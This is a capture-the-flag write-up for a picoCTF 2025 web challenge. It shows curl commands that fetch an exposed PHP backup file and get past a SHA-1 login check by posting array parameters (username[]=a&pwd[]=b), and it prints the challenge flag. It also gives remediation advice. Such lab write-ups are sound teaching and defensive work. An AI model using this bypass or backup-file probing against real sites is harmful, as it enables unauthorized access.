# Apriti sesamo — picoCTF 2025

## Challenge Information

- **Challenge:** Apriti sesamo
- **Platform:** CyLab Security Academy
- **Event:** picoCTF 2025
- **Category:** Web Exploitation
- **Difficulty:** Medium
- **Target:** `http://xebec.cylabacademy.net:21931/`
- **Status:** Solved
- **Primary Concepts:** PHP type confusion, array injection, SHA-1, source-code disclosure

## 1. Objective

Investigate a web application that claims to be impossible to hack, identify the weakness in its authentication logic, and retrieve the challenge flag.

## 2. Initial Reconnaissance

Opened the challenge instance in the browser.

The homepage displayed a welcome message and a Login button. Clicking Login opened:

`/impossibleLogin.php`

Inspected the page using browser Developer Tools and identified the following form structure:

```html
<form action="impossibleLogin.php" method="post">
    <input type="text" name="username">
    <input type="password" name="pwd">
    <input type="submit" value="Login">
</form>
```

### Observations

- The application uses a PHP backend.
- Authentication is performed through an HTTP POST request.
- The username parameter is `username`.
- The password parameter is `pwd`.

## 3. Establishing a Baseline

Requested the login page:

```bash
curl -i http://xebec.cylabacademy.net:21931/impossibleLogin.php
```

The server returned `HTTP/1.1 200 OK` and displayed the login form.

Submitted invalid credentials:

```bash
curl -i -X POST \
  -d 'username=test&pwd=test' \
  http://xebec.cylabacademy.net:21931/impossibleLogin.php
```

The response contained:

```text
Failed! No flag for you
```

The HTTP status remained `200 OK`, showing that the status code alone was insufficient to determine whether authentication had succeeded.

## 4. Discovering the Source-Code Backup

Tested for a common editor backup filename:

```bash
curl -i \
  'http://xebec.cylabacademy.net:21931/impossibleLogin.php~'
```

The server returned the PHP source code in the HTTP response.

Saved the source locally for analysis:

```bash
curl -s \
  'http://xebec.cylabacademy.net:21931/impossibleLogin.php~' \
  -o backup.txt
```

The recovered source contained obfuscated parameter names and Base64-encoded strings.

The important authentication logic was equivalent to:

```php
if ($username == $password) {
    // Display a decoy message
} else {
    if (sha1($username) === sha1($password)) {
        echo file_get_contents($flag_path);
    } else {
        // Display a failure message
    }
}
```

This revealed two important conditions:

1. The username and password must not compare equal using `==`.
2. Their SHA-1 results must compare equal using `===`.

The source code also revealed that the successful branch reads a file using `file_get_contents()`.

## 5. Vulnerability Analysis

### 5.1 PHP array injection

PHP populates the `$_POST` superglobal from submitted form data.

Ordinary form parameters such as:

```text
username=alice&pwd=secret
```

produce string values.

However, parameters submitted using bracket notation can produce arrays:

```text
username[]=a&pwd[]=b
```

Conceptually, PHP receives:

```php
$_POST['username'] = ['a'];
$_POST['pwd'] = ['b'];
```

### 5.2 Unexpected input types

The application passes these parameters directly to `sha1()` without validating their types.

In the challenge's PHP 7.4 environment, passing an array to `sha1()` produces a warning and returns `null`.

Consequently:

```php
sha1(['a']) === sha1(['b'])
```

evaluates as:

```php
null === null
```

which is `true` in this environment.

The first comparison evaluates to false because the two arrays contain different values. Execution therefore reaches the second comparison.

**Root cause:** The application fails to validate input types and incorrectly allows invalid hash-function results to satisfy the authentication condition.

## 6. Exploitation

Submitted two different arrays as the username and password:

```bash
curl -i -X POST \
  -d 'username[]=a&pwd[]=b' \
  http://xebec.cylabacademy.net:21931/impossibleLogin.php
```

The response contained two PHP warnings:

```text
Warning: sha1() expects parameter 1 to be string,
array given
```

The server then returned the flag.

This confirmed the vulnerability hypothesis.

## 7. Flag

```text
academy{w3Ll_d3sErV3d_Ch4mp_0e9666bf}
```

## 8. Attack Chain

1. Enumerated the login page.
2. Identified the POST parameter names.
3. Submitted ordinary invalid credentials to establish a baseline.
4. Tested for an exposed PHP backup file.
5. Retrieved and analyzed the server-side source code.
6. Identified missing input-type validation in the authentication logic.
7. Submitted array-valued parameters.
8. Triggered the faulty hash comparison and retrieved the flag.

## 9. Remediation

A secure implementation should:

- Validate that username and password are strings before processing them.
- Reject arrays and other unexpected input types.
- Handle invalid function arguments without allowing authentication to continue.
- Use appropriate password hashing and verification functions, such as `password_hash()` and `password_verify()`, for stored passwords.
- Remove editor backup files from production web directories.
- Disable public access to sensitive source files and prevent unnecessary PHP warnings from being displayed to users.

Example input validation:

```php
$username = $_POST['username'] ?? null;
$password = $_POST['pwd'] ?? null;

if (!is_string($username) || !is_string($password)) {
    http_response_code(400);
    exit('Invalid input');
}
```

This validation must be combined with a properly implemented authentication mechanism; it is not a complete login system by itself.

## 10. Lessons Learned

- HTML inspection reveals form structure, but server-side code determines authentication behavior.
- HTTP status codes do not always indicate application-level success or failure.
- Backup files ending in `~` can expose sensitive PHP source code.
- PHP parameters may be arrays even when the application expects strings.
- Strict comparison is not inherently unsafe; comparing two invalid results can still produce an unintended success.
- Reading source code and tracing conditional branches is more reliable than blindly trying payloads.
- Error messages can reveal function behavior, argument types, and server-side implementation details.


## 11. Conclusion

The challenge was solved by discovering an exposed PHP backup file and analyzing its authentication logic. Submitting arrays instead of strings caused `sha1()` to return `null` for both inputs in the target PHP environment. Because the application compared those results strictly, the authentication condition succeeded and exposed the flag.